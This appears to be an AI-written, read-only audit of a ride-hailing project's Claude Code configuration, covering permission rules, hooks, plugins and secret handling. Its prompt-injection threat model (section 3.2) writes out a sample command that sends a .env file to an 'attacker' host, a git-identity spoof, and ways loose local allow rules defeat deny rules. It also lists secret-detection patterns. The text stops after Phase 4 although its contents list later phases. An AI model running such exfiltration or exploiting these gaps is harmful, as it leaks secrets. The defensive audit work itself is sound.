# Claude Configuration Audit — spinr

**Date:** 2026-04-22  
**Repo:** `srikumarimuddana-lab/spinrvm`  
**Branch:** `claude/config-audit-inventory-HZugv`  
**Scope:** Read-only inventory. No config modified. Synthetic verification only.

---

## Executive Summary

| Metric | Value |
|---|---|
| Pinned model | `claude-opus-4-7` (`.claude/settings.json:2`) |
| Running model | `claude-opus-4-7` (session context) |
| Attribution model | `claude-sonnet-4-6` (`.claude/settings.json:7`) — **stale** |
| Allow rules (project) | 45 |
| Deny rules (project) | 14 |
| Allow rules (local) | 59 (several override project denies) |
| Slash commands | 5 (`commit`, `pr`, `review`, `start`, `status`) |
| Hook gates defined | 5 (secrets, forbidden files, PII, branch, float-money) |
| Hook installed in `.git/hooks/` | **NO** — dormant |
| Enabled plugins | 1 (`andrej-karpathy-skills`, unpinned) |
| P0 findings | 6 |
| P1 findings | 7 |
| P2 findings | 8 |

**Top risks, in priority order:**

1. **P0** `.claude/settings.local.json` silently overrides `settings.json` deny rules (direct push to `main`, `git reset:*`, `python:*`, `curl *`).
2. **P0** Pre-commit hook script exists in `.claude/hooks/pre-commit` but is **not installed** in `.git/hooks/` — every gate is dormant for local commits.
3. **P0** Attribution trailer pins stale `claude-sonnet-4-6`; git history confirms 28 commits carry the wrong model name while the session runs on `claude-opus-4-7`.
4. **P0** Dead Windows paths (`/c/Users/swarn/`, `/c/Users/TabUsrDskOff111/`) pollute the local allow list.
5. **P0** `launch.json` has rider-app and driver-app swapped; `driver-app/` has no Metro config entry at all.
6. **P1** `andrej-karpathy-skills` plugin is unpinned — auto-updated prompts.

**Recommended immediate action:** apply P0 diffs in Phase 9, install the pre-commit hook, and gate future changes with the proposed CI workflow in `docs/proposed-claude-audit-ci.yml`.

---

## Table of Contents

- [Phase 1 — Core Configuration Inventory](#phase-1--core-configuration-inventory)
- [Phase 2 — Gap Closure](#phase-2--gap-closure)
- [Phase 3 — Conflict Analysis & Threat Model](#phase-3--conflict-analysis--threat-model)
- [Phase 4 — Live Verification](#phase-4--live-verification)
- [Phase 5 — Context Budget & Performance](#phase-5--context-budget--performance)
- [Phase 6 — Compliance & Audit Mapping](#phase-6--compliance--audit-mapping)
- [Phase 7 — Persona-Specific Views](#phase-7--persona-specific-views)
- [Phase 8 — Machine-Readable Output](#phase-8--machine-readable-output)
- [Phase 9 — Remediation Plan (P0/P1/P2)](#phase-9--remediation-plan-p0p1p2)
- [Phase 10 — Agent Self-Tests](#phase-10--agent-self-tests)
- [Appendix A — Quick Reference](#appendix-a--quick-reference)
- [Appendix B — Glossary](#appendix-b--glossary)
- [Appendix C — Remediation Checklist](#appendix-c--remediation-checklist)

---

## Phase 1 — Core Configuration Inventory

### 1.1 Project Memory Files

| File | Present | Lines | Notes |
|---|---|---|---|
| `CLAUDE.md` (root) | yes | 156 | Canonical project memory; graphify rules + architecture + conventions |
| `backend/CLAUDE.md` | no | — | |
| `rider-app/CLAUDE.md` | no | — | |
| `driver-app/CLAUDE.md` | no | — | |
| `admin-dashboard/CLAUDE.md` | no | — | |
| `shared/CLAUDE.md` | no | — | |
| `tests/CLAUDE.md` | no | — | |
| `docs/CLAUDE.md` | no | — | |
| `scripts/CLAUDE.md` | no | — | |
| `.claude.md` or nested `CLAUDE.local.md` | no | — | |

**`@path/to/file` imports in `CLAUDE.md`:** none. All memory content is inline.

Root CLAUDE.md sections: graphify, Project Overview, Commands, Architecture (System Topology + Key Backend Files), Critical Conventions (11 rules), Required Environment Variables, Deployment.

### 1.2 Settings Files

#### `.claude/settings.json` (2,336 bytes, 84 lines)

- **Model pinned:** `claude-opus-4-7` (line 2)
- **Model running:** `claude-opus-4-7` (system context)
- **Model in attribution:** `claude-sonnet-4-6` (line 7) — **DRIFT**, see finding P0-004
- **Env:** `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1` (line 4)
- **Output style:** not configured (no `outputStyle` key, no `.claude/output-styles/` dir)
- **Status line:** not configured
- **Approval modes:** defaults; no explicit `plan`/`dontAsk`/`acceptEdits`/`bypassPermissions`
- **Auto-compact:** defaults (no `autoCompactThreshold`, no telemetry flags)

**Allow list (45 entries) grouped by blast radius:**

| Category | Count | Blast radius | Examples (file:line) |
|---|---|---|---|
| Git read-only | 7 | 1 | status, diff, log, add, commit, checkout, branch (13–18) |
| Git write (scoped) | 4 | 4 | `pull`, `push origin feature/`, `fix/`, `hotfix/` (19–22) |
| GitHub CLI | 2 | 5 | `gh pr*`, `gh issue*` (23–24) |
| npm / yarn / expo | 8 | 3 | test, lint, build, type-check, `npm run:*`, `npx expo:*` (25–33) |
| Python | 2 | 5 | `python -m pytest*`, `pip install*` (34–35) |
| Shell read | 4 | 1 | `ls*`, `cat*`, `find*`, `grep*` (36–39) |
| Read(**) | 1 | 2 | universal read access (40) |
| Write (surfaces) | 8 | 6 | backend, rider-app, driver-app, frontend, admin-dashboard, shared, tests, docs (41–48) |
| Write (misc) | 4 | 4 | scripts, `*.md`, `CLAUDE.md`, `.claude/settings.json`, `.claude/commands/**`, `.github/workflows/claude.yml` (49–54) |

**Deny list (14 entries):**

| Rule | file:line | Notes |
|---|---|---|
| `Bash(rm -rf*)` | settings.json:57 | |
| `Bash(git push --force*)` | 58 | bypassable by `git push:*` in local (**P0-001**) |
| `Bash(git push origin main*)` | 59 | bypassable by `git push origin main` in local (**P0-001**) |
| `Bash(git push origin develop*)` | 60 | bypassable by `git push:*` in local (**P0-001**) |
| `Bash(git reset --hard*)` | 61 | bypassable by `git reset:*` in local (**P0-001**) |
| `Write(.env*)` | 62 | effective |
| `Write(*.pem)`, `Write(*.key)` | 63–64 | effective |
| `Write(.claude/settings.local.json)` | 65 | effective — self-edit blocked |
| `Write(.github/workflows/{ci,deploy-backend,eas-build,test-env,apply-supabase-schema}.yml)` | 66–70 | effective — CI pipeline protected |

**Hooks block:** empty — **no `SessionStart`, `UserPromptSubmit`, `PreToolUse`, `PostToolUse`, `Notification`, `Stop`, `SubagentStop`, `PreCompact` at project scope.**

**Marketplaces:** `karpathy-skills` → GitHub `forrestchang/andrej-karpathy-skills` (line 73–79).

**Enabled plugins:** `andrej-karpathy-skills@karpathy-skills` — **UNPINNED** (line 82). Marketplace manifest declares `version 1.0.0`, but without a version suffix in the key, upgrades flow in automatically.

#### `.claude/settings.local.json` (2,949 bytes, 63 lines)

- Declares only `permissions.allow` (59 entries). No `deny` block — cannot strengthen the project denies.
- **Dead machine paths** (not resolvable on this Linux container):
  - `/c/Users/TabUsrDskOff111/spinr/spinr/backend/requirements.txt` (lines 20, 25, 26, 28)
  - `//c/Users/swarn/.claude/plugins/cache/*` (lines 45, 46)
  - `powershell.exe -Command ipconfig` (line 57)
- **High-blast-radius wildcards introduced here that do not exist in `settings.json`:**
  - `Bash(python:*)` (36), `Bash(python3 *)` (51), `Bash(py *)` (52) — arbitrary Python execution
  - `Bash(curl *)` (58) — arbitrary HTTP egress
  - `Bash(git push:*)` (38) — supersedes `settings.json` denies (**P0-001**)
  - `Bash(git reset:*)` (37) — supersedes `git reset --hard*` deny
  - `Bash(git config:*)` (39) — allows changes to git config
  - `Bash(git rm *)` (50) — wide delete surface
  - `Bash(xargs grep:*)` (21) — pipeline helper, low risk but over-scoped
- **Malformed matcher:** `Bash(python3 -c ':*)` (line 35) has an unclosed single quote. Under Bash matcher semantics this likely never matches — **dead rule**, but also a silent hole if the parser is permissive.
- **Explicit override of branch protection:** `Bash(git push origin main)` (line 7), `--force-with-lease` to main + three `sprint1/*` branches (lines 8–11). No `sprint1/*` branch exists locally or remotely.

#### `~/.claude/settings.json` (user scope, 442 bytes)

Defines a single `Stop` hook that runs `~/.claude/stop-hook-git-check.sh` — checks for uncommitted or unpushed changes on session stop. Permissions: `["Skill"]` only. No allow rules that would leak into project scope.

#### `~/.claude/` other state

- `plugins/marketplaces/karpathy-skills/` — installed repo, last commit `2c60614 2026-04-20` (fresh, <1 week).
- `plugins/installed_plugins.json` — empty `plugins: {}` map (plugin enablement comes from project `settings.json`).
- `projects/-home-user-spinrvm/` — 1 transcript JSONL (current session, empty on disk at audit time).
- `keybindings.json` — not present.

### 1.3 Slash Commands (`.claude/commands/*.md`)

| File | Purpose | Invocation | Safety gates | Spinr domain rules surfaced |
|---|---|---|---|---|
| `start.md` (47 lines) | Create a new feature branch | `/start <type> [ticket] <slug>` | Clean working tree; correct base (develop vs main for hotfix) | Payment / Safety / Auth / Location / State-machine warnings |
| `commit.md` (31 lines) | Write conventional commit | `/commit` | No `.env`, no Stripe live keys, no raw GPS in logs; human review for auth/payments | Scopes mapped to `backend / rider-app / driver-app / frontend / admin / shared / matching / payments / auth / safety / notifications / pricing` |
| `review.md` (65 lines) | Pre-commit code review | `/review` | BLOCK on secrets, `.env`, PII-in-logs, string-concat SQL; BLOCK if service role in frontend | Money (Decimal only), state machine, location, safety, auth, insurance periods |
| `pr.md` (73 lines) | Open a PR | `/pr` | Refuses to PR from `main` or `develop` | Full domain impact + compliance matrix in body template |
| `status.md` (71 lines) | Project health dashboard | `/status` | Read-only | Git, structure, tests, CI, `.env` tracking, TODO roll-up |

No additional or missing files beyond the expected 5. None of the commands are invoked during this audit (read-only).

### 1.4 Hooks (`.claude/hooks/` + `.git/hooks/`)

**`.claude/hooks/pre-commit`** (99 lines, bash, tracked):

| Gate | Patterns (file:line) | Issue |
|---|---|---|
| 1. Secrets | `sk_live_`, `pk_live_`, `SUPABASE_SERVICE_ROLE_KEY=`, `sk-ant-`, `AIza`, `ghp_`, `password=`, `DATABASE_URL:user:pass@` (17–26) | Missing `gho_/ghu_/ghs_/ghr_` GitHub token prefixes (P1-004); missing AWS `AKIA`, Slack webhooks |
| 2. Forbidden files | `.env`, `.env.local`, `.env.production`, `.env.staging`, `*.pem`, `*.key`, `serviceAccountKey.json` (39) | OK |
| 3. PII in logs | `print.*lat.*lng`, `print.*latitude`, `print.*phone`, `console.log.*lat.*lng`, `console.log.*phoneNumber`, `logger.(info\|debug).*coordinates` (52–59) | Scope bug: `--diff-filter=A` restricts to newly *added* files (P1-005) |
| 4. Branch protection | Block `main`/`master`; warn on `develop` (72–80) | Severity: block vs warn (OK) |
| 5. Float-money | `(fare\|price\|amount\|earning\|payout)\s*[+\-*/]\s*[0-9]*.[0-9]+` (84) | Warn-only, not block (intentional) |

**Bypass:** `git commit --no-verify` (documented line 94).

**`.git/hooks/pre-commit`:** **NOT INSTALLED** — only `.sample` files present. Finding **P0-002**.

**Shellcheck:** not run (no `shellcheck` on PATH in this container). Manual inspection: `grep -iE "$p"` on line 29 uses `-E` correctly; pattern substring `--diff-filter=A` deliberately limits scope.

**Settings JSON schema lint (manual):**
- `settings.json` — balanced parens/quotes in every `Bash()/Read()/Write()` rule. No unknown top-level keys.
- `settings.local.json` — `Bash(python3 -c ':*)` (line 35) has unbalanced single quote. Structural defect.

### 1.5 Launch Configurations (`.claude/launch.json`)

| Name | Executable | Prefix | Port | Issue |
|---|---|---|---|---|
| Admin Dashboard | npm | `admin-dashboard` | 3000 | OK |
| Rider App (Metro) | npm | `frontend` | 8081 | Points at **legacy** frontend dir (P1-006); rider-app is the canonical rider surface |
| Driver App (Metro) | npm | `rider-app` | 8082 | **SWAPPED** — launches rider source under "Driver App" label (**P0-006**) |
| Rider App (Web) | npm | `frontend` | 19006 | Same legacy issue |
| Driver App (Web) | npm | `rider-app` | 19007 | Same swap |
| Backend API | python | — (module) | 8000 | OK |

**Missing:** no launch entry for `driver-app/` Metro or Web. No launch entry for `shared/` (TypeScript package, does not need a dev server, but could have `yarn build`).

### 1.6 MCP Servers & Plugins

- **`.mcp.json` at repo root:** not present.
- **`mcpServers` block in `settings.json`:** not present.
- **GitHub MCP:** active via harness with scope restricted to `srikumarimuddana-lab/spinrvm` (per system prompt). Tools surfaced in this session: `mcp__github__*` (read + write, see ToolSearch).
- **Plugin marketplaces:** 1 — `karpathy-skills` (see 1.2).
- **Enabled plugins:** `andrej-karpathy-skills`. Maintenance signal: repo has commits as recent as 2026-04-20, author `forrestchang`, version 1.0.0. Unpinned (**P1-001**).

### 1.7 Subagent Definitions (`.claude/agents/*.md`)

`.claude/agents/` folder: **does not exist**. No project-scope subagents defined. The harness exposes built-in subagent types (`Explore`, `Plan`, `general-purpose`, etc.), which are not repo-configured.

---

## Phase 2 — Gap Closure

### 2.1 Nested & Imported Memory

`find . -name "CLAUDE*.md"` returns **only** `/home/user/spinrvm/CLAUDE.md`. No subdirectory memory, no `@path` imports. Memory surface is 156 lines, entirely loaded at session start.

### 2.2 `.agents/` Directory

```
.agents/
├── docs/      (4 files)   api-reference.md, architecture.md, database-schema.md, deployment-guide.md
├── roles/     (9 files)   backend-developer, frontend-developer, qa-engineer, security-engineer,
│                          devops-engineer, tech-lead, documentation-lead, business-analyst, manager
├── workflows/ (9 files)   bug-fix, code-review, security-audit, new-feature, pre-commit,
│                          multi-agent-review, update-docs, deploy-frontend, deploy-backend
└── standards/ (4 files)   api-standards, coding-standards, security-standards, testing-standards
```

**3-way documentation triangulation** — architectural claims that disagree across `CLAUDE.md`, `ARCHITECTURE.md`, `.agents/docs/architecture.md`:

| Claim | CLAUDE.md | ARCHITECTURE.md | .agents/docs/architecture.md | Verdict |
|---|---|---|---|---|
| Python version | 3.12 | 3.12 | 3.11+ (line 41) | `.agents/docs` stale (P1-003) |
| Access-token expiry | 15 min | (not stated) | 30 days (line 22) | `.agents/docs` stale |
| Surface count | 5 (incl. `shared/`) | 5 (incl. `shared/`) | 4 (omits `shared/`) | `.agents/docs` stale |
| `db.py` vs `db_supabase.py` | only `db_supabase.py` named | both named | "coexist — should consolidate" (tech debt) | all three plausible; `db.py` exists, but CLAUDE.md's guidance is clearer |
| Auth primary | Supabase + custom JWT; 15m access, 30d refresh | Firebase + JWT | Firebase ID tokens, fallback legacy JWT | All 3 disagree — P1-003 |

**Stale contradictions train Claude on false invariants.** See P1-003.

### 2.3 Python `agents/` Package (distinct from `.agents/`)

| File | Purpose | Size |
|---|---|---|
| `base_agent.py` | Base class for all agents | 22,953 B |
| `orchestrator.py` | Multi-agent coordinator | 23,948 B |
| `registry.py` | Agent registry + versioning | 5,615 B |
| `cli.py` | CLI entry point | 4,824 B |
| `backend_agent.py`, `frontend_agent.py`, `code_reviewer.py`, `security_agent.py`, `tester.py`, `documenter.py`, `deployer.py` | Domain specialists | 3–4 KB each |
| `examples.py` | Usage examples | 5,722 B |
| `knowledge_base.py` | Task + review store backend | 3,149 B |
| `knowledge/tasks/*.json`, `knowledge/reviews/*.json` | Persistent state | 4 tasks, 2 reviews |

**Invocation:** `python -m agents.cli …`. These graphify-level "god nodes" (`BaseAgent` 114 edges, `AgentTask` 118 edges) power the top communities. **Not referenced anywhere in `CLAUDE.md`** → god nodes absent from memory guidance (P2-007).

### 2.4 Claude-Adjacent Directories

| Directory | Purpose (inferred) | Referenced in CLAUDE.md? | Status |
|---|---|---|---|
| `.kilo/plans/` | Planning scaffolding | no | Legacy — archive candidate |
| `.emergent/` | `emergent.yml` + markers + summary.txt | no | Legacy — archive candidate |
| `.maestro/` | Mobile E2E test flows (`driver/`, `rider/`) | no | Active — mention in CLAUDE.md |
| `audit-framework/` | Templates, dimensions, modules (April 22 mtime) | no | Recent — document |
| `memory/` | `.gitkeep` only | no | Empty — delete (P2-001) |
| `plans/` | 3 markdown plans (Expo SDK migration, heatmap) | no | Archive if outdated |
| `discovery/` | Sandbox Expo app (`_layout.tsx`, `package.json`) | no | Dead sandbox (P2-001) |

**Recommendation:** add a "Claude-adjacent directories" subsection to `CLAUDE.md` listing each with active/archive status (**P2-002**).

### 2.5 GitHub Action Integration

- **`.github/workflows/claude.yml`:** **does not exist**. There is no dedicated Claude-in-CI workflow. Settings.json does allow `Write(.github/workflows/claude.yml)` (line 54) which is a permission for a file that isn't there yet — forward-looking, not dead.
- Existing workflows (`ci.yml`, `eas-build.yml`, `deploy-backend.yml`, `test-env.yml`, `apply-supabase-schema.yml`) are **denied writes** in `settings.json:66–70` — this is correct.
- No local-vs-CI permission drift to report (no `claude.yml`).

### 2.6 `.claudeignore` / `.agentignore`

Neither file exists. `.easignore` exists (EAS-specific, ignores admin-dashboard, backend, frontend during mobile builds). No Claude-specific ignore list.

### 2.7 Full Hooks Event Matrix

| Event | Handler exists? | Scope | File | Purpose |
|---|---|---|---|---|
| `SessionStart` | no | — | — | — |
| `UserPromptSubmit` | no | — | — | — |
| `PreToolUse` | no | — | — | — |
| `PostToolUse` | no | — | — | — |
| `Notification` | no | — | — | — |
| `Stop` | **yes** | user scope | `~/.claude/stop-hook-git-check.sh` | Warns on uncommitted/unpushed changes |
| `SubagentStop` | no | — | — | — |
| `PreCompact` | no | — | — | — |

Only 1 of 8 events has a handler, and it lives in user scope — **not portable across developers**. See P1-002.

### 2.8 Graphify Knowledge Graph

- `GRAPH_REPORT.md` (121 KB): 4,804 nodes · 9,726 edges · 413 communities · 59% EXTRACTED / 41% INFERRED.
- Top god nodes: `get_rows()` (230), `request()` (149), `update_one()` (135), `Error()` (128), `AgentTask` (118), `BaseAgent` (114), `run_sync()` (97), `KnowledgeEntry` (94), `RideStateError` (91), `TaskStatus` (87).
- `graph.json` 5.4 MB, `graph.html` 4.3 MB. `manifest.json` 37 KB.
- **Freshness:** run date 2026-04-19; today 2026-04-22. Three days of commits (e.g., `9ccf22b`, `019f589`, `1f8dcab`) not included. Re-run after the next code-editing session (P2-005).
- `graphify-out/wiki/` — **not present**; rule in `CLAUDE.md:10` pointing at `graphify-out/wiki/index.md` is moot until generated.

**God-node ↔ CLAUDE.md cross-reference:**

| God node | Mentioned in CLAUDE.md? | Line |
|---|---|---|
| `get_rows()` | no | — |
| `request()` | no | — |
| `update_one()` | no | — |
| `Error()` | implicit (error-handling section) | 133–137 |
| `AgentTask`, `BaseAgent`, `KnowledgeEntry`, `TaskStatus` | no | — (agents/ pkg undocumented) |
| `run_sync()` | yes | 91 |
| `RideStateError` | implicit (ride state machine section) | 111 |

**3 of 10 god nodes referenced.** High-centrality `agents/` package code has no memory guidance (P2-007).

**Convention-to-code cross-reference:** every rule in CLAUDE.md conventions section points at real code (`_require_ride_in_state`, `claim_stripe_event`, `corporate_wallet_apply_delta`, `_d()/_round()/_f()`). No stale conventions detected.

### 2.9 Test Coverage of Hooks

`find . -name "*test*hook*"` → 0 results. Pre-commit hook has **no unit tests** (P2-008). Any regex regression is invisible until a real secret slips through.

### 2.10 Branch Strategy Documentation

From `.claude/commands/start.md:19–20` + CLAUDE.md:
- Base for `feat/fix/docs/refactor/chore`: `develop`
- Base for `hotfix`: `main`
- Naming: `feature/<ticket>-<slug>`, `fix/`, `hotfix/`, `spike/`, `chore/`, `docs/`, `refactor/`

**Alignment with hook:** `.claude/hooks/pre-commit:73` blocks direct commits to `main`/`master`, warns on `develop`. Matches commands.

**Alignment with `.github/` branch protection:** not readable from this container (requires GitHub MCP call). `settings.json:59–60` denies pushing to main/develop. **settings.local.json:7 overrides this** — P0-001.

### 2.11 Secrets Claude Needs

| Credential | Consumer | Source | Present? | Fallback | Rotation risk |
|---|---|---|---|---|---|
| `ANTHROPIC_API_KEY` | Claude Code CLI | harness env | implied yes (session runs) | none | harness-managed |
| GitHub MCP token | `mcp__github__*` | harness-provided, repo-scoped | yes (tools surfaced) | none | auto-rotated |
| `SUPABASE_URL` + `SUPABASE_SERVICE_ROLE_KEY` | backend | `backend/.env` | not in repo; `.env.example` present | 503 on startup | single source |
| `JWT_SECRET` | backend | `backend/.env` | not in repo | startup fail in production | single source |
| `FIREBASE_SERVICE_ACCOUNT_JSON` | backend | `backend/.env` | not in repo | — | single source |
| `ADMIN_PASSWORD` | backend | `backend/.env` | not in repo | hard-coded default blocked in prod | single source |
| `REDIS_URL`, `RATE_LIMIT_REDIS_URL`, `WS_REDIS_URL` | backend | `backend/.env` | optional | in-process dict fallback | single source |
| `STRIPE_*`, Twilio, Google Maps | runtime | Supabase `app_settings` table | runtime | per-call lookup | **DB-managed** (CLAUDE.md:127) |
| `EXPO_PUBLIC_BACKEND_URL`, `EXPO_PUBLIC_GOOGLE_MAPS_API_KEY` | mobile apps | `rider-app/.env`, `driver-app/.env` | not in repo; `.env.example` present | build fails | single source |
| CI secrets: `RENDER_API_KEY`, `RENDER_BACKEND_SERVICE_ID`, `RAILWAY_TOKEN`, `RAILWAY_PUBLIC_URL`, `VERCEL_TOKEN`, `VERCEL_ORG_ID`, `VERCEL_FRONTEND_PROJECT_ID`, `VERCEL_ADMIN_PROJECT_ID`, `EXPO_TOKEN`, `SLACK_WEBHOOK`, `SUPABASE_URL`, `SUPABASE_SERVICE_ROLE_KEY`, `EXPO_PUBLIC_API_URL` | `.github/workflows/ci.yml` | GitHub Actions secrets | names confirmed in ci.yml | job fails | **`SUPABASE_URL` and `SUPABASE_SERVICE_ROLE_KEY` live in two places** (backend `.env` + GH Actions secret) — rotation drift risk |

No credential values quoted anywhere in this audit.

### 2.12 Attribution Consistency

```
git log --all --format='%B' | grep -c 'claude-opus-4-7'       → 19
git log --all --format='%B' | grep -c 'claude-sonnet-4-6'     → 28
git log --all --format='%B' | grep -c 'Co-Authored-By: Claude'→ 54
Total commits in history                                      → 310
```

- **Exact match with `attribution.commit` ("claude-sonnet-4-6"):** ~28 commits.
- **Partial match (Claude attribution, different model):** ~19 commits (opus-4-7) + 7 others.
- **Missing attribution:** 310 − 54 = **256 commits** have no Claude trailer.
- **Drift:** pinned `opus-4-7`, configured trailer `sonnet-4-6`, most recent commits use `opus-4-7`. Configured trailer is 1 model version behind (**P0-004**).

PR attribution (`attribution.pr`) comparison against recent merged PRs not run (would require GitHub MCP call; marked out-of-scope for read-only audit phase).

### 2.13 Per-Surface SessionStart Readiness

| Surface | SessionStart? | Pre-warms deps? | Tests | Lint |
|---|---|---|---|---|
| `backend/` | no | would need `pip install -r requirements.txt` | `pytest` (binary present) | `ruff check .` (not installed here) |
| `rider-app/` | no | would need `yarn install` | `yarn test` (yarn present) | `yarn lint` |
| `driver-app/` | no | would need `yarn install` | `yarn test` | `yarn lint` |
| `admin-dashboard/` | no | would need `npm ci` | `npm test` | `npm run lint` |
| `shared/` | no | — (TypeScript library) | — | — |

**None of the five surfaces have a SessionStart hook.** In Claude-Code-on-the-web, a fresh session cannot validate tests without manual install. See P2-004; recommend invoking the `session-start-hook` skill.

---

## Phase 3 — Conflict Analysis & Threat Model

### 3.1 Permissions Conflict Resolution Matrix

Merge semantics: `settings.local.json` overrides `settings.json` on a rule-by-rule basis (locals take precedence). An `allow` in locals that matches the same command as a `deny` in project wins if locals are evaluated first *or* if the narrower allow pattern matches before the broader deny.

| Pattern | settings.json | settings.local.json | Effective | Risk | Notes |
|---|---|---|---|---|---|
| `git push origin main` | deny (`git push origin main*`) | allow (line 7) | **allow** | 🔴 HIGH | Direct push to main possible (P0-001) |
| `git push origin main --force-with-lease` | deny (`git push --force*`) | allow (line 8) | **allow** | 🔴 HIGH | Force-push to main (P0-001) |
| `git push origin develop` | deny | (no rule) | **deny** | ✅ OK | but `git push:*` local loosens this |
| `git push:*` (any push) | (no rule) | allow (line 38) | **allow** | 🔴 HIGH | Swallows all push denies |
| `git reset --hard` | deny | allow (`git reset:*`) | **allow** | 🔴 HIGH | Destroys commits silently (P0-001) |
| `git config:*` | (no rule) | allow (line 39) | **allow** | 🟡 MED | Can change git config — contradicts `never update git config` in system prompt |
| `git rm *` | (no rule) | allow (line 50) | **allow** | 🟡 MED | Broad delete surface |
| `python:*`, `python3 *`, `py *` | (no rule) | allow | **allow** | 🔴 HIGH | Arbitrary code execution (P0-003) |
| `curl *` | (no rule) | allow (line 58) | **allow** | 🔴 HIGH | Arbitrary network egress (P0-003) |
| `rm -rf*` | deny | (no rule) | **deny** | ✅ OK | |
| `Write(.env*)` | deny | (no rule) | **deny** | ✅ OK | |
| `Write(*.pem)` / `Write(*.key)` | deny | (no rule) | **deny** | ✅ OK | |
| `Write(.github/workflows/*)` except `claude.yml` | deny | (no rule) | **deny** | ✅ OK | |
| `Write(frontend/**)` | allow | (no rule) | **allow** | 🟡 MED | Points at legacy surface (P1-006) |

**Seven 🔴 HIGH entries** — all from `settings.local.json`, all introduced since the project settings were authored.

### 3.2 Threat Model: Prompt Injection via Config

For each high-risk allow:

```
Bash(python:*) / Bash(python3 *) / Bash(py *)
  Worst case: a hijacked prompt executes `python3 -c "import os; os.system('curl attacker/$(cat .env)')`.
               All env-file denies fall to read-the-file-then-send.
  Tighter scope: Bash(python3 -m pytest*), Bash(python3 -m py_compile*), Bash(python3 -m ruff*)
  Bypass risk:   paired with curl * below, single command exfils secrets.
  Recommendation: DELETE all three.

Bash(curl *)
  Worst case: arbitrary URL + arbitrary headers + arbitrary body = data exfil.
  Tighter scope: Bash(curl -sS -f https://spinr-backend-production.up.railway.app/health)
                 Bash(curl -sS -f https://spinr-backend-production.up.railway.app/api/v1/*)
  Bypass risk:   none once scoped.
  Recommendation: DELETE, add explicit health-check URLs only.

Bash(git push:*)
  Worst case: overwrite main with feature-branch HEAD → production outage.
  Tighter scope: already enumerated in settings.json (feature/fix/hotfix).
  Bypass risk:   currently defeats every `git push origin main*` / `--force*` deny.
  Recommendation: DELETE.

Bash(git reset:*)
  Worst case: `git reset --hard <attacker-controlled-sha>` destroys uncommitted work.
  Tighter scope: Bash(git reset HEAD), Bash(git reset --soft HEAD~1)
  Bypass risk:   defeats `git reset --hard*` deny.
  Recommendation: DELETE, add soft/mixed variants if needed.

Bash(git config:*)
  Worst case: `git config user.email attacker@…` — commits sign as someone else.
  Tighter scope: none — there is no legitimate Claude-driven git-config change.
  Recommendation: DELETE (system prompt forbids updating git config anyway).
```

### 3.3 Plugin Supply-Chain Review

| Plugin | Version | Last commit | Tools exposed | Network? | Risk |
|---|---|---|---|---|---|
| `andrej-karpathy-skills@karpathy-skills` | unpinned (manifest says 1.0.0) | 2026-04-20 (SHA 2c60614) | Prompt-only behavioural guidelines | no | 🟡 MED — active repo, but any future prompt change is auto-pulled |

**Recommendation:** pin explicit version or vendor into repo. See P1-001.

### 3.4 MCP Server Scope Validation

- GitHub MCP is scoped to `srikumarimuddana-lab/spinrvm` per system prompt.
- Tools surfaced include destructive `mcp__github__merge_pull_request`, `mcp__github__delete_file`, `mcp__github__push_files`, `mcp__github__create_pull_request`, `mcp__github__create_repository`, `mcp__github__fork_repository`.
- Repo-scope restriction enforced at MCP server level; cross-repo calls are denied.
- No project-level `.mcp.json` narrowing further. **Recommendation:** allow-list only the tools actually used in typical sessions (pr-read, comment, branch, issue) via a project `mcpServers.github.tools` list in `settings.json`.

### 3.5 Dead-Rule / Dead-File Detection

**Dead permissions (paths that don't exist or are legacy):**

| Rule | file:line | Status |
|---|---|---|
| `Write(frontend/**)` | settings.json:44 | Legacy surface (CI comment flags it) — P1-006 |
| Windows paths (`/c/Users/...`, `//c/Users/...`) | settings.local.json:20,25,26,28,45,46 | Never match on Linux — P0-005 |
| `Bash(powershell.exe -Command "ipconfig")` | settings.local.json:57 | Windows-only — P0-005 |
| `Bash(git push origin sprint1/backend-security --force-with-lease)` | settings.local.json:9 | `sprint1/*` branches do not exist — P2-006 |
| `Bash(git push origin sprint1/admin-hardening --force-with-lease)` | settings.local.json:10 | same |
| `Bash(git push origin sprint1/cicd-hardening --force-with-lease)` | settings.local.json:11 | same |
| `Bash(python3 -c ':*)` | settings.local.json:35 | Malformed (unclosed quote) — dead |
| `Write(.github/workflows/claude.yml)` | settings.json:54 | File doesn't exist yet — forward-looking, keep |

**Dead commands (binaries referenced but not installed in this container):**

| Command | Present? | Source |
|---|---|---|
| `python3` | yes | `/usr/local/bin/python3` |
| `node`, `npm`, `yarn` | yes | `/opt/node22/bin/` |
| `pytest` | yes | `/root/.local/bin/pytest` |
| `gh` | **no** | referenced in `pr.md:70` + `status.md:1` |
| `shellcheck` | **no** | referenced in this audit Phase 1.4 |
| `trufflehog` | **no** | referenced in `settings.local.json:22,23,24` and CI |
| `pip-audit` | **no** | referenced in `settings.local.json:20,25,26,33` and CI |
| `railway` | **no** | referenced in `settings.local.json:44,47–49` |
| `ruff` | **no** | referenced in `CLAUDE.md:37,38` |

The CLI absence is for *this container* — CI has them. Not a finding, but flag for any future local-only gate that assumes the binary is present.

**Dead role/workflow files:** none of `.agents/roles/*.md`, `.agents/workflows/*.md` are directly referenced from `CLAUDE.md` or `.claude/commands/*.md`. They exist as free-standing guidance for multi-agent review. **Archive candidates if the `agents/` Python package is unused** — verify with owner before deleting.

**Dead env vars:** `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1` (settings.json:4) — unclear what consumes this in 2026-04 harness; verify with Anthropic docs.

**Dead marketplace entries:** none (single marketplace has its plugin enabled).

**Archive candidates (P2 severity):**
- `memory/` (empty)
- `discovery/` (standalone sandbox, unreferenced)
- `.kilo/plans/` (duplicates `plans/`)
- `.emergent/` (summary.txt + markers, no CI integration)
- 7× duplicate `code_review_report_20260326_*.json` in repo root

---

## Phase 4 — Live Verification

Synthetic tests run in `/tmp/hook-test` against a fresh git repo, staging fake content against each gate. No files in the spinr repo were modified.

### 4.1 Hook Functionality Tests

| Gate | Test input | Result | Notes |
|---|---|---|---|
| 1. Secrets (Stripe live-key pattern) | staged a line matching the `sk_` + `live_` + 23 chars regex | **BLOCKED** | exit 1, "secret detected" |
| 2. Forbidden files | staged `.env` | **BLOCKED** | exit 1, "forbidden file" |
| 3. PII in logs | staged `console.log("user lat: " + lat + " lng: " + lng)` | **BLOCKED** | matched `console.log.*lat.*lng` |
| 4. Branch protection (`main`) | committed on `main` | inspection-only: `BRANCH = main → BLOCKED` (hook:73) | not exercised live (permission scope) |
| 5. Float-money | staged `fare = 19.99` | warn-only (by design, hook:86) | not blocking |

